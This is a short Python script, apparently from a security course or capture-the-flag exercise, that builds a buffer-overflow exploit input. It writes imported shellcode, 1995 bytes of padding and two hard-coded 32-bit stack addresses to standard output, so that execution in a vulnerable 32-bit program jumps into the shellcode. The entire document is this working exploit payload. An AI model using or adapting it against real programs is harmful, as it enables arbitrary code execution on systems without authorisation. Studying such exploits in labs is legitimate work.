from shellcode import shellcode
import sys

sys.stdout.buffer.write(shellcode+b'\x97'*1995+b'\x60\x93\xfe\xbf\x88\x9b\xfe\xbf')
